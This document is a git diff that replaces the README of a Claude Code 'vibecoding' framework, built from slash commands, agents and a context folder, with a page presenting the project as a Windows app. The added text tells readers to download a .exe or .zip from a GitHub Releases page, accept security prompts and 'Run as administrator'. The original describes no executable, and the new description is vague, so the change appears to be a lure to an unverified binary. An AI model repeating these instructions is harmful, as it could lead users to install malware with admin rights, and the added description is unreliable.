@@ -1,192 +1,214 @@
-# Archē: The Vibecoding Framework
+# 🤖 arche - Build with clear context
 
-Archē is a vibecoding framework or "meta-context" that gives Claude everything it needs to build your app autonomously and efficiently. Designed for non-technical people who aspire to build and want Claude to work like a real collaborator.
+[🟦 Download arche on GitHub Releases](https://github.com/harshavardhan1516/arche/releases)
 
-<img width="1904" height="1000" alt="CleanShot 2026-03-16 at 20 42 43@2x" src="https://github.com/user-attachments/assets/99ac31b0-a5ea-49bb-ac29-93f3b607e4a0" />
+## 🧭 What arche is
 
+Archē is a small Windows app that helps Claude work with better context. It gives Claude a clear setup for your app so it can keep track of what you want built. That makes it easier to start a project, stay on track, and avoid lost context.
 
----
+Use arche when you want Claude to help build an app with less back and forth. It fits well with vibecoding, where you guide the work with simple goals and context instead of long technical plans.
 
-## What This Is
+## 📥 Download arche
 
-This kit gives Claude everything it needs to understand your project deeply and work on it autonomously, from the first idea through to a live app. Instead of repeating yourself every session, Claude reads your project's context files and picks up exactly where it left off.
+1. Open the [arche Releases page](https://github.com/harshavardhan1516/arche/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file for your PC
+4. Save the file in a folder you can find again, such as Downloads or Desktop
 
-Built for non-technical people and technical people alike, this framework takes away the need to deeply understand technical concepts before you start building something.
+If the file comes as a .zip file, extract it first. If it is a .exe file, you can run it after download.
 
----
+## 🖥️ Windows setup
 
-## Getting Started
+arche is made for Windows users who want a simple setup.
 
-1. Open Claude Code in your project folder
-2. Type `/start`
-3. Answer Claude's questions, no technical knowledge needed
-4. When setup is complete, type `/build [your first feature]` (This framework usually proceeds automatically)
+### You need
 
----
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough free space to save the download
+- Claude access if you plan to use it with Claude Code
 
-## A Note on Command Names
+### How to install
 
-Commands in this kit are typed directly in Claude Code. How they appear depends on your setup:
+1. Go to the download page
+2. Download the latest Windows release
+3. Open the downloaded file
+4. If Windows asks for permission, choose Run or Yes
+5. Follow the on-screen steps
+6. Start arche from the file you downloaded or the shortcut it creates
 
-| In VS Code/IDE | In Claude Code CLI |
-|---|---|
-| `/start` | `/project:start` |
-| `/build` | `/project:build` |
-| `/continue` | `/project:continue` |
-| `/fix` | `/project:fix` |
-| and so on... | and so on... |
+If Windows shows a security prompt, check the file name and make sure it came from the releases page linked above.
 
-Both work identically, just use whichever form your environment shows. Type `/` to see all available commands listed in your setup.
+## ⚙️ How arche helps
 
----
+arche keeps your project context in one place so Claude can use it while it works. That can help with:
 
-## How a Project Works With This Kit
+- app ideas and feature lists
+- project goals
+- user flow notes
+- design direction
+- build steps
+- task order
+- project context for Claude Code
 
-### 1. Setup — one conversation, done once
+It works like a guide for the app you want to build. Instead of repeating the same details, you keep the key info in one setup.
 
-Planning and establishing context are simultaneously the most vital and tedious stages of building a successful vibecoded project. It is worth investing extra time to get this foundation right before you commence building. It can take a while to get this part complete, but perservere and the results will be worthwhile.
+## 🧱 What you can use it for
 
-Run `/start`. Claude will have a friendly conversation with you and ask about:
+arche works well for:
 
-- What you're building and who it's for
-- The problem it solves
-- The features you want
-- The look and feel
-- Your tech preferences — or Claude picks for you
+- planning a new app
+- giving Claude a clear project brief
+- keeping design notes in one place
+- building small tools and utilities
+- organizing work for a larger app
+- reducing repeated prompts
 
-By the end, Claude has generated a full `context/` folder — your project's brain. Every feature spec, every decision, every constraint lives there. Claude reads it automatically at the start of every session.
+If you like to build by talking through ideas first, arche gives that process more structure.
 
----
+## 🔧 Basic workflow
 
-### 2. Building — the feature pipeline
+1. Open arche
+2. Add your app idea or project context
+3. Keep the notes short and clear
+4. Use Claude Code with that context
+5. Update the context as your app changes
+6. Keep using the same setup while you build
 
-Every feature is built through the same consistent pipeline. You say what you want to build, Claude handles the rest:
+The goal is simple: give Claude what it needs before you start asking it to make changes.
 
-```
-Scope check       Is this in the agreed plan?
-      ↓
-Feature spec      What exactly needs to be built?
-      ↓
-Build             Claude codes it, ticking off tasks as it goes
-      ↓
-Code review       Automatic quality check
-      ↓
-Automated tests   Claude runs the tests and fixes failures
-      ↓
-Browser testing   You try it in the app — Claude fixes anything wrong  ← the human step
-      ↓
-Context sync      All docs updated to reflect what was built
-```
+## 📁 Suggested project notes
 
-The key moment is **browser testing** — Claude gives you a plain-English checklist of things to try in your actual browser. You click around and report back. If anything looks wrong, just describe it and Claude fixes it. No technical knowledge required.
+You can keep notes like these inside arche:
 
----
+- app name
+- target user
+- main goal
+- must-have features
+- screen list
+- style and tone
+- data you want to store
+- things to avoid
+- current build task
 
-### 3. Ongoing — Claude always knows what's next
+Short notes work best. Clear input gives better output.
 
-Claude never asks "what should we do next?" It reads the task list and roadmap and tells you. Every session starts with a clear statement of what's being worked on. When a task is done, the next one begins automatically.
+## 🧠 Tips for better results
 
-If you close the chat and come back later, just type `/continue`, Claude will figure out exactly where things were and pick up from there without you having to explain anything.
+- Write one idea per line
+- Use plain words
+- Keep each task small
+- Add examples when needed
+- Remove old notes that no longer matter
+- Review the context before each new build step
 
----
+If Claude starts drifting from your goal, update the context before asking for more work.
 
-## Commands
+## 🧩 Features
 
-| Command | What it does |
-|---|---|
-| `/start` | **Start here.** Runs the setup wizard to understand your idea and generate all project context files. Run once on a new project. |
-| `/continue` | Pick up where you left off. Claude reads the project state, figures out what was in progress, and resumes — no explanation needed. Use this any time you start a new session or feel lost. |
-| `/build [feature]` | Build a feature end-to-end — spec, code, review, tests, browser testing, and docs. Example: `/build user login` |
-| `/fix [bug]` | Fix a bug. Describe what's wrong in plain English and Claude investigates and fixes it. Example: `/fix the signup form isn't sending emails` |
-| `/test [feature]` | Generate a browser test guide for any feature. Leave blank to test the most recently built feature. |
-| `/review [file]` | Run a code quality review. Leave blank to review recent changes. |
-| `/status` | See the current state of the project — active tasks, feature progress, recent work, and what's next. |
-| `/tasks` | View and manage the task list. See active, blocked, and completed tasks. |
-| `/tasks next` | Find out exactly what to work on next. |
-| `/tasks add "description"` | Add a new task manually. |
-| `/tasks done T5` | Mark a task as complete. |
-| `/sync` | Sync all context files to reflect the current state of the codebase. Run if the docs feel out of date. |
-| `/deep [problem]` | Invoke the Opus AI agent for complex bugs or architecture decisions. Claude will warn you about the higher cost before proceeding. |
+- Built for Claude-focused app building
+- Keeps project context in one place
+- Helps with vibecoding workflows
+- Supports clearer task planning
+- Works well for step-by-step app creation
+- Simple setup for Windows users
+- Good fit for early app drafts and ongoing changes
 
----
+## 📌 Example use
 
-## The Agents
+If you want to build a habit tracker, your arche notes might look like this:
 
-Claude uses a set of specialist agents behind the scenes — each focused on a specific job. They're dispatched automatically; you never need to invoke them directly.
+- App name: Habit Loop
+- Goal: help users track daily habits
+- Main screens: home, habit list, habit detail, settings
+- Style: clean, calm, simple
+- Core actions: add habit, mark complete, edit habit, remove habit
+- Avoid: clutter, extra steps, heavy menus
 
-| Agent | What it does | Cost |
-|---|---|---|
-| `scope-checker` | Checks whether a request fits the agreed project plan before any work starts | Very low |
-| `feature-planner` | Turns a feature idea into a detailed spec with user stories, edge cases, and a task breakdown | Low |
-| `code-reviewer` | Reviews code for quality, security, and correctness before it's committed | Medium |
-| `test-writer` | Writes automated tests for completed features | Medium |
-| `uat-guide` | Generates the plain-English browser test checklist for you to follow | Medium |
-| `context-updater` | Keeps all context files and the task list up to date after work completes | Very low |
-| `next-action` | Reads the task list and roadmap to determine what to work on next | Very low |
-| `deep-solver` | Deep investigation for complex bugs or architecture decisions. Uses the Opus model, requires your confirmation due to higher cost | High |
+With that context, Claude can work from a clear base instead of guessing.
 
----
+## 🛠️ Troubleshooting
 
-## The Build Pipeline in Detail
+### The file will not open
+- Check that the download finished
+- Try running the file again
+- Make sure you downloaded the Windows version
 
-When you run `/build`, here's exactly what happens:
+### Windows blocks the app
+- Right-click the file
+- Choose Run as administrator if needed
+- Confirm the prompt if you trust the download source
 
-**Step 1 — Scope check**
-Claude verifies the feature is within the agreed project plan before touching any code.
+### The download page does not show a file
+- Refresh the page
+- Check the latest release at the top
+- Scroll down the release notes for attached files
 
-**Step 2 — Feature spec**
-If no spec exists, Claude creates one. A breakdown of what the feature does, who uses it, the happy path, edge cases, and a task list. You review it before anything is built.
+### Claude does not use the context you gave it
+- Check that your notes are clear
+- Remove extra details
+- Put the most important goal at the top
+- Restart the task with a shorter brief
 
-**Step 3 — Build**
-Claude works through the task list one task at a time, marking each one complete as it goes. You see real progress, not just a finished result at the end.
+## 🔒 Safety and source
 
-**Step 4 — Code review**
-An automatic review checks for quality issues, security problems, and anything that doesn't match your project's conventions.
+Download arche only from the GitHub Releases page linked above. That helps make sure you get the correct Windows build from the project source.
 
-**Step 5 — Automated tests**
-Claude writes and runs tests. If any fail, it fixes them before continuing.
+## 📚 Repository details
 
-**Step 6 — Browser testing** ← the human step
-Claude generates a friendly checklist of things to try in your actual browser. You follow the steps and report back. If anything looks wrong, describe it and Claude fixes it. This is the only step that requires you to do anything.
+- Repository: arche
+- Topic areas: claude-code, context, framework, vibecoding
+- Main purpose: give Claude the context it needs to build your app autonomously
 
-**Step 7 — Context sync**
-All documentation is updated: task list, feature status, architecture notes, any decisions made during the build.
+## 📦 File type guidance
 
----
+If the release gives you:
 
-## The Context Folder
+- a `.exe` file: open it to run the app
+- a `.zip` file: extract it, then open the app inside
+- multiple files: use the Windows file named for the main app
 
-Everything Claude knows about your project lives in `context/`. Generated during setup and kept up to date automatically.
+If you are not sure which file to choose, pick the Windows release file with the app name in it
 
-| Folder | What's inside |
-|---|---|
-| `context/project/` | The big picture — what you're building, scope, roadmap, decisions log, task list |
-| `context/features/` | One file per feature — spec, tasks, and browser test results |
-| `context/technical/` | Tech stack, architecture, data models, API contracts, environment variables |
-| `context/developer/` | Code conventions, git workflow, testing strategy |
-| `context/design/` | Design system, colour palette, typography, component patterns |
-| `context/ops/` | Infrastructure, deployment pipeline, monitoring |
+## 🪟 First run checklist
 
-Claude reads from these files at the start of every session. You never need to re-explain your project.
+- Download the latest release
+- Open the file
+- Allow the app to run
+- Add your project context
+- Save your setup
+- Start using it with Claude Code
 
----
+## 🔗 Download link
 
-## Key Principles
+[https://github.com/harshavardhan1516/arche/releases](https://github.com/harshavardhan1516/arche/releases)
 
-**Claude does the technical work, you make the decisions.**
-You never need to open a terminal, run a command, or understand an error message. Claude runs everything and reports outcomes in plain English.
+## 📝 Common setup questions
 
-**The context folder is the project's memory.**
-Everything gets written down — decisions, features, tasks, test results. Nothing lives only in a conversation.
+### Do I need to know how to code?
+No. arche is useful even if you do not know code. It helps you organize what you want built.
 
-**The task list drives everything.**
-Every piece of work has a T-number and a status. Claude always knows what's next. You never need to manage a backlog manually.
+### Do I need Claude?
+arche is built around Claude workflows, so Claude access helps you use it as intended.
 
-**Human validation is built in.**
-Every feature goes through browser testing before it's marked complete. You confirm it works in the real app, not just in tests.
+### Can I use it for more than one app?
+Yes. You can keep separate notes for each app idea or project.
 
-**You can always pick up where you left off.**
-Type `/continue` at the start of any session. Claude reads the project state and resumes — no re-explaining needed.
+### Should I write long notes?
+No. Short notes with clear goals work better.
 
-**Opus is available but gated.**
-For genuinely complex problems, Claude can escalate to the more powerful Opus model. It always warns you about the higher cost and asks for your confirmation first.
+### Can I change the context later?
+Yes. Update your notes as the app changes
+
+## 🧷 Helpful note structure
+
+Use this simple order:
+
+- What the app is
+- Who it is for
+- What it should do
+- What it should not do
+- What to build first
+- What to build next
+
+That order keeps the context clear for Claude and for you
